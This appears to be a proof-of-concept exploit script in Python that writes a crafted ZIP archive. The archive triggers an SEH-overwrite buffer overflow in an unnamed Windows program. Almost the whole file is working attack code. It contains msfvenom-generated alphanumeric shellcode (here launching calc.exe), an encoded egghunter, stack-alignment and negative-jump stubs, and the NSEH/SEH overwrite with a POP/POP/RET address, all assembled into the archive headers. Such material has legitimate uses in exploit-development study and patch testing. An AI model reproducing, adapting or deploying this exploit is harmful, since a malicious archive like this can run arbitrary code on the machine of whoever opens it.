#!/usr/bin/env python
import struct
import sys

# Filename
file_name = "hodorlol.zip"

# Variables for headers
file_size = "\xe4\x0f"
dir_size = "\x12\x10\x00\x00"
offset_dir = "\x02\x10\x00\x00"

# Headers
ldf_header = (      "\x50\x4B\x03\x04\x14\x00\x00"
                    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00"
                     + file_size +
                    "\x00\x00\x00" )

cdf_header = (      "\x50\x4B\x01\x02\x14\x00\x14"
                    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    + file_size +
                    "\x00\x00\x00\x00\x00\x00\x01\x00"
                    "\x24\x00\x00\x00\x00\x00\x00\x00" )

eofcdf_header = (   "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
                     + dir_size + 
                     offset_dir +
                    "\x00\x00" )

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f python -b '\x00\x0a\x0d' -v shellcode bufferregister=edi
# Size 440 bytes
shellcode =  ""
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x6b\x4c\x6b\x58\x4b\x32\x47\x70"
shellcode += "\x37\x70\x35\x50\x35\x30\x4d\x59\x5a\x45\x35\x61"
shellcode += "\x49\x50\x35\x34\x6c\x4b\x46\x30\x34\x70\x6e\x6b"
shellcode += "\x63\x62\x76\x6c\x6c\x4b\x43\x62\x36\x74\x4c\x4b"
shellcode += "\x34\x32\x64\x68\x54\x4f\x6d\x67\x70\x4a\x66\x46"
shellcode += "\x50\x31\x59\x6f\x4e\x4c\x75\x6c\x50\x61\x43\x4c"
shellcode += "\x56\x62\x76\x4c\x77\x50\x6a\x61\x58\x4f\x66\x6d"
shellcode += "\x65\x51\x6a\x67\x5a\x42\x6a\x52\x56\x32\x72\x77"
shellcode += "\x6c\x4b\x70\x52\x44\x50\x4e\x6b\x53\x7a\x37\x4c"
shellcode += "\x6c\x4b\x42\x6c\x47\x61\x43\x48\x6a\x43\x70\x48"
shellcode += "\x45\x51\x78\x51\x36\x31\x6c\x4b\x46\x39\x47\x50"
shellcode += "\x43\x31\x4b\x63\x4c\x4b\x53\x79\x77\x68\x79\x73"
shellcode += "\x37\x4a\x71\x59\x4c\x4b\x35\x64\x4c\x4b\x35\x51"
shellcode += "\x38\x56\x44\x71\x4b\x4f\x6e\x4c\x6a\x61\x78\x4f"
shellcode += "\x66\x6d\x65\x51\x6b\x77\x37\x48\x79\x70\x71\x65"
shellcode += "\x58\x76\x66\x63\x51\x6d\x6b\x48\x47\x4b\x33\x4d"
shellcode += "\x51\x34\x63\x45\x6d\x34\x73\x68\x4e\x6b\x33\x68"
shellcode += "\x77\x54\x37\x71\x4b\x63\x51\x76\x4c\x4b\x76\x6c"
shellcode += "\x32\x6b\x4e\x6b\x30\x58\x75\x4c\x73\x31\x78\x53"
shellcode += "\x6c\x4b\x76\x64\x6c\x4b\x53\x31\x38\x50\x6f\x79"
shellcode += "\x72\x64\x66\x44\x57\x54\x51\x4b\x33\x6b\x75\x31"
shellcode += "\x61\x49\x42\x7a\x36\x31\x4b\x4f\x49\x70\x43\x6f"
shellcode += "\x31\x4f\x72\x7a\x4c\x4b\x65\x42\x6a\x4b\x6c\x4d"
shellcode += "\x33\x6d\x62\x4a\x53\x31\x6e\x6d\x4b\x35\x4d\x62"
shellcode += "\x67\x70\x65\x50\x47\x70\x70\x50\x31\x78\x50\x31"
shellcode += "\x6e\x6b\x72\x4f\x6e\x67\x39\x6f\x38\x55\x6d\x6b"
shellcode += "\x48\x70\x58\x35\x79\x32\x30\x56\x72\x48\x39\x36"
shellcode += "\x4a\x35\x4d\x6d\x4d\x4d\x39\x6f\x6e\x35\x37\x4c"
shellcode += "\x45\x56\x61\x6c\x75\x5a\x4b\x30\x6b\x4b\x6b\x50"
shellcode += "\x32\x55\x53\x35\x6f\x4b\x43\x77\x77\x63\x32\x52"
shellcode += "\x30\x6f\x53\x5a\x65\x50\x43\x63\x69\x6f\x79\x45"
shellcode += "\x50\x63\x43\x51\x72\x4c\x55\x33\x56\x4e\x75\x35"
shellcode += "\x72\x58\x62\x45\x63\x30\x41\x41"

# Badbytes: 0x0a 0x0d 0x0f 0x3a 0x3b 0x5c
badbytes = ( 
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# Egghunter ODOR, ASCII encoded
# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 -f python -v egghunt --platform Windows
egghunt =  ""
egghunt += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunt += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
egghunt += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
egghunt += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
egghunt += "\x42\x75\x4a\x49\x62\x46\x4f\x71\x4b\x7a\x6b\x4f"
egghunt += "\x46\x6f\x53\x72\x52\x72\x53\x5a\x47\x72\x70\x58"
egghunt += "\x38\x4d\x74\x6e\x55\x6c\x53\x35\x73\x6a\x71\x64"
egghunt += "\x58\x6f\x78\x38\x31\x42\x50\x4f\x61\x54\x42\x6f"
egghunt += "\x6c\x4b\x6b\x4a\x6e\x4f\x30\x75\x6b\x5a\x6c\x6f"
egghunt += "\x30\x75\x48\x67\x6b\x4f\x39\x77\x41\x41"

# Eggstring
egg = "ODOR"[::-1] * 2

# Align ESP's
align_esp_s2 = (    "\x54"                          # PUSH ESP
                    "\x58"                          # POP EAX
                    "\x66\x2D\x17\x01"              # SUB AX, 0x117
                    "\x50"                          # PUSH EAX
                    "\x5c")                         # POP ESP

align_esp_s1 = (    "\x54"                          # PUSH ESP
                    "\x58"                          # POP EAX
                    "\x66\x05\x45\x06"              # ADD AX, 0x645
                    "\x50"                          # PUSH EAX
                    "\x5c")                         # POP ESP

# Negative jump ASCII encoded
# nasm > jmp -0x127
# 00000000  E9D4FEFFFF        jmp 0xfffffed9
neg_jmp_s1 = (  "\x25\x4A\x4D\x4E\x55"		# and eax,0x554e4d4a
                "\x25\x35\x32\x31\x2A"		# and eax,0x2a313235
                "\x2D\x41\x37\x37\x37"		# sub eax,0x37373741
                "\x2D\x69\x25\x25\x25"		# sub eax,0x25252569
                "\x2D\x72\x32\x49\x49"		# sub eax,0x49493272
                "\x2D\x5C\x5A\x5A\x5A"		# sub eax,0x5a5a5a5c
                "\x50"                          # push eax
                "\x25\x4A\x4D\x4E\x55"		# and eax,0x554e4d4a
                "\x25\x35\x32\x31\x2A"		# and eax,0x2a313235
                "\x2D\x09\x76\x76\x76"		# sub eax,0x76767609
                "\x2D\x74\x74\x74\x74"		# sub eax,0x74747474
                "\x2D\x39\x39\x39\x39"		# sub eax,0x39393939
                "\x2D\x4B\x4B\x4B\x4B"		# sub eax,0x4b4b4b4b
                "\x50"                		# push eax
                "\x2D\x63\x09\x7B\x7B"		# sub eax,0x7b7b0963
                "\x2D\x05\x04\x68\x66"		# sub eax,0x66680405
                "\x2D\x4B\x4B\x4B\x4B"		# sub eax,0x4b4b4b4b
                "\x2D\x63\x63\x63\x63"		# sub eax,0x63636363
                "\x50" )                        # push eax

# Lengths and offsets
maxlen = 4068

# Crashes
crash_ebp = 288
crash_esi = 1376
crash_nseh = 296
crash_seh = crash_nseh + 4

# Offset of address for stage 2 after negative jmp from stage 1
ret_jmp_s2 = 204

# Building variables and content, sequential order as being placed in "payload"
# Stage 2: Align ESP and place egghunter
stage2 = "A" * 8
stage2 += align_esp_s2 + egghunt
stage2 += "B" * (ret_jmp_s2 - len(stage2))
# Stage 1: Align ESP and negative JMP back on stack
stage1 = align_esp_s1 + neg_jmp_s1
stage1 += "C" * (crash_nseh - len(stage1 + stage2))
# NSEH / SEH
nseh = struct.pack("<L", 0xff774c4c)                # DEC ESP # DEC ESP # JNO 0x3 # Jumps 0x80 back on ESP, converts 0xff to 0x80 # Jumps 0x7E back
seh = struct.pack("<L", 0x00411b1f)                 # POP/POP/RET
# Stage 3: Containing egg to be found and shellcode
stage3 = egg
stage3 += shellcode
# Suffix as filler
suffix = ""
suffix += "E" * (maxlen - len(stage2 + stage1 + nseh + seh + stage3))

# Construct payload
payload = stage2 + stage1 + nseh + seh + stage3 + suffix

# Check if size matches
if len(payload) != 4068:
    print("[!] Warning, payload size isn't correct!")

# Craft final string to save as file
# Added payload multiple times: a third and last time for placing egg and shellcode somewhere in memory, which gets detected by the egghunter
exploit = ldf_header + payload + cdf_header + payload + eofcdf_header + payload

# Print size and write file
print("Size : {s}".format(s=len(payload)))
with open(file_name, 'w') as f:
    f.write(exploit)
